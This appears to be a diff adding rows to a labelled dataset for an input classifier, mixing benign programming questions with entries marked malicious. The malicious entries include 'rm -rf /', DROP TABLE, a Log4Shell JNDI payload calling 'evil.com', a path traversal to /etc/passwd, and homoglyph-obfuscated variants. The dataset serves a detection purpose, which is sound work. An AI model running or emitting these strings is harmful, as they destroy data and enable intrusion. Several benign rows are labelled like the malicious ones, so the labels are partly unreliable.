+{"text": "import​ os; os.system('rm -rf /')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "DROP\\x20\\x20TABLE\\x20\\x20users;", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "How should I implement Kubernetes?", "label": 1, "category": "best_practice", "subcategory": "augmented", "pattern": "best_practice"}
+{"text": "What is the purpose of environment variables?", "label": 1, "category": "technical_question", "subcategory": "general_tech", "pattern": "technical_question"}
+{"text": "How do I sort an array in Java?", "label": 1, "category": "technical_question", "subcategory": "general_tech", "pattern": "technical_question"}
+{"text": "Show me how to write a for loop in JavaScript", "label": 1, "category": "technical_question", "subcategory": "general_tech", "pattern": "technical_question"}
+{"text": "DROP TABLе users;", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "еval('alert(1)')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "rm\\x20\\x20-rf\\x20\\x20/", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "rM -rf /", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "rm\\x20-rf\\x20/", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "Can I get a demo? Thanks!", "label": 0, "category": "general_questions", "subcategory": "normal_benign"}
+{"text": "${jndi:ldap://evil.com/a}", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "../../../еtc/passwd", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "Explain PostgreSQL for beginners", "label": 1, "category": "educational", "subcategory": "augmented", "pattern": "educational"}
+{"text": "impоrt  os;  os.system('rm  -rf  /')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "The interface is user-friendly. Thanks!", "label": 0, "category": "feedback", "subcategory": "normal_benign"}
+{"text": "I want to understand REST better", "label": 1, "category": "educational", "subcategory": "augmented", "pattern": "educational"}
